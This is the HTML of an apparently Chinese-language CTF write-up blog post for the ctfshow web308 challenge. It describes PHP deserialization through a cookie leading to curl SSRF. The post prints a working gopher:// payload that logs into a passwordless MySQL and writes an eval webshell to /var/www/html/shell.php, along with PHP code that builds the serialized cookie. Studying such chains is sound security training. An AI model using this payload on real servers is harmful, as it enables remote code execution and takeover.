@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="知识点 php脚本中header跳转后，后面的代码依然会执行。  php脚本之间可以嵌套包含，如2.php包含了1.php，3.php包含了2.php，那么在3.php中可以直接输出1.php的变量。  有一些php脚本没有类，文件内容都是函数，别的php脚本包含该脚本就可以直接调用这些函数。   题目分析web308的反序列化点在index.php中，需要注意的是利用点并不在unserializ">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php反序列化之gopher打无密码mysql">
+<meta property="og:url" content="http://example.com/2024/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bgopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81mysql/index.html">
+<meta property="og:site_name" content="K1ato&#39;s blog">
+<meta property="og:description" content="知识点 php脚本中header跳转后，后面的代码依然会执行。  php脚本之间可以嵌套包含，如2.php包含了1.php，3.php包含了2.php，那么在3.php中可以直接输出1.php的变量。  有一些php脚本没有类，文件内容都是函数，别的php脚本包含该脚本就可以直接调用这些函数。   题目分析web308的反序列化点在index.php中，需要注意的是利用点并不在unserializ">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2024/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bgopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81mysql/1.PNG">
+<meta property="article:published_time" content="2024-09-14T03:20:50.000Z">
+<meta property="article:modified_time" content="2024-09-14T04:56:49.136Z">
+<meta property="article:author" content="k1ato">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bgopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81mysql/1.PNG">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>php反序列化之gopher打无密码mysql</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/09/09/nodejs-vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bgopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81mysql/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bgopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81mysql/&text=php反序列化之gopher打无密码mysql"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bgopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81mysql/&title=php反序列化之gopher打无密码mysql"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bgopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81mysql/&is_video=false&description=php反序列化之gopher打无密码mysql"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=php反序列化之gopher打无密码mysql&body=Check out this article: http://example.com/2024/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bgopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81mysql/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bgopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81mysql/&title=php反序列化之gopher打无密码mysql"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bgopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81mysql/&title=php反序列化之gopher打无密码mysql"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bgopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81mysql/&title=php反序列化之gopher打无密码mysql"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bgopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81mysql/&title=php反序列化之gopher打无密码mysql"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bgopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81mysql/&name=php反序列化之gopher打无密码mysql&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bgopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81mysql/&t=php反序列化之gopher打无密码mysql"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gopherus%E5%91%BD%E4%BB%A4%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">Gopherus命令：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">payload：</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        php反序列化之gopher打无密码mysql
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">k1ato</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-09-14T03:20:50.000Z" class="dt-published" itemprop="datePublished">2024-09-14</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul>
+<li><p>php脚本中header跳转后，后面的代码依然会执行。</p>
+</li>
+<li><p>php脚本之间可以嵌套包含，如2.php包含了1.php，3.php包含了2.php，那么在3.php中可以直接输出1.php的变量。</p>
+</li>
+<li><p>有一些php脚本没有类，文件内容都是函数，别的php脚本包含该脚本就可以直接调用这些函数。</p>
+</li>
+</ul>
+<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>web308的反序列化点在index.php中，需要注意的是利用点并不在unserialize()中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$service = unserialize(base64_decode($_COOKIE[&#x27;service&#x27;]));</span><br><span class="line">if($service)&#123;</span><br><span class="line">    $lastVersion=$service-&gt;checkVersion();     //这才是利用点</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>pop链最终的代码执行部分：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function checkUpdate($url)&#123;</span><br><span class="line">		$ch=curl_init();</span><br><span class="line">		curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">		curl_setopt($ch, CURLOPT_HEADER, false);</span><br><span class="line">		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</span><br><span class="line">		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);</span><br><span class="line">		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); </span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);</span><br><span class="line">		$res = curl_exec($ch);</span><br><span class="line">		curl_close($ch);</span><br><span class="line">		return $res;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很明显，可以ssrf，又在config.php中获取了mysql的配置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class config&#123;</span><br><span class="line">	private $mysql_username=&#x27;root&#x27;;</span><br><span class="line">	private $mysql_password=&#x27;&#x27;;</span><br><span class="line">	private $mysql_db=&#x27;sds&#x27;;</span><br><span class="line">	private $mysql_port=3306;</span><br><span class="line">	private $mysql_host=&#x27;localhost&#x27;;</span><br><span class="line">	public $cache_dir = &#x27;cache&#x27;;</span><br><span class="line">	public $update_url = &#x27;https://vip.ctf.show/version.txt&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到mysql没有密码，考虑用gopher协议打无密码mysql。</p>
+<h3 id="Gopherus命令："><a href="#Gopherus命令：" class="headerlink" title="Gopherus命令："></a>Gopherus命令：</h3><img src="/2024/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bgopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81mysql/1.PNG" class="">
+
+
+
+<h3 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class config&#123;</span><br><span class="line">	public $update_url = &#x27;gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%4c%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%52%45%51%55%45%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%73%68%65%6c%6c%2e%70%68%70%22%01%00%00%00%01&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">class dao&#123;</span><br><span class="line">	private $config;</span><br><span class="line">	public function __construct()&#123;</span><br><span class="line">		$this-&gt;config=new config();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a=new dao();</span><br><span class="line">echo base64_encode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>cookie中设置字段<code>service</code>，访问index.php即可。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gopherus%E5%91%BD%E4%BB%A4%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">Gopherus命令：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">payload：</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bgopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81mysql/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bgopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81mysql/&text=php反序列化之gopher打无密码mysql"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bgopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81mysql/&title=php反序列化之gopher打无密码mysql"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bgopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81mysql/&is_video=false&description=php反序列化之gopher打无密码mysql"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=php反序列化之gopher打无密码mysql&body=Check out this article: http://example.com/2024/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bgopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81mysql/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bgopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81mysql/&title=php反序列化之gopher打无密码mysql"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bgopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81mysql/&title=php反序列化之gopher打无密码mysql"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bgopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81mysql/&title=php反序列化之gopher打无密码mysql"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bgopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81mysql/&title=php反序列化之gopher打无密码mysql"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bgopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81mysql/&name=php反序列化之gopher打无密码mysql&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bgopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81mysql/&t=php反序列化之gopher打无密码mysql"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    k1ato
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
